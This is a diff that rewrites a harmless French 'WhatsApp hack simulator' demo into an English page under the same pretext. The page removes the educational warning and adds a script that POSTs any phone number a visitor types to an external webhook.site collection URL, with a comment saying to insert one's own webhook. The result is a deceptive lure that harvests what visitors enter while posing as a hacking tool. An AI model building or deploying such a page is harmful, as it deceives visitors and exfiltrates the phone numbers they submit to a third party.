@@ -1,72 +1,64 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WhatsApp Hack Simulator</title>
+  <title>WhatsApp Hacker - Fake Demo</title>
   <style>
     body {
+      background: linear-gradient(to right, #1f1f1f, #2b2b2b);
+      color: #fff;
       font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
-      color: white;
-      text-align: center;
-      padding: 50px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
     }
-    .container {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 30px;
-      border-radius: 15px;
-      max-width: 400px;
-      margin: auto;
+    h1 {
+      margin-bottom: 20px;
+      font-size: 28px;
     }
-    input, button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 10px;
-      border: none;
-      border-radius: 8px;
+    input[type="text"] {
+      padding: 10px;
       font-size: 16px;
+      width: 300px;
+      margin-bottom: 20px;
+      border: none;
+      border-radius: 5px;
     }
     button {
-      background-color: #00c853;
-      color: white;
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #4caf50;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
       cursor: pointer;
     }
-    .result {
-      margin-top: 20px;
-      font-size: 18px;
-      font-weight: bold;
-    }
-    .warning {
-      color: yellow;
-      font-size: 14px;
-      margin-top: 30px;
+    button:hover {
+      background-color: #45a049;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Simulateur de piratage WhatsApp</h1>
-    <p>Entrez un numéro WhatsApp :</p>
-    <input type="text" id="phone" placeholder="Ex: +27681600073"
-    <button onclick="simulateHack()">Lancer l'attaque</button>
-    <div class="result" id="result"></div>
-    <div class="warning">
-      Ceci est un site factice à but éducatif. Ne jamais utiliser ou croire de tels outils.
-    </div>
-  </div>
+  <h1>WhatsApp Hack Simulator</h1>
+  <input type="text" id="number" placeholder="+27681600073.">
+  <button onclick="sendData()">Lancer le piratage</button>
+
   <script>
-    function simulateHack() {
-      const phone = document.getElementById("phone").value;
-      const result = document.getElementById("result");
-      if (phone.trim() === "") {
-        result.innerHTML = "Veuillez entrer un numéro valide.";
-        return;
-      }
-      result.innerHTML = "Connexion au serveur...";
-      setTimeout(() => {
-        result.innerHTML = Erreur : ${phone} est protégé par la sécurité WhatsApp.;
-      }, 2000);
+    function sendData() {
+      const number = document.getElementById('number').value;
+      fetch('https://webhook.site/b9f721df-4883-411d-812a-a57a3fd1e879', {  // Remplace avec ton vrai lien Webhook
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ whatsapp_number: number })
+      })
+      .then(response => alert('Données envoyées au serveur.'))
+      .catch(error => alert('Erreur : ' + error));
     }
   </script>
 </body>
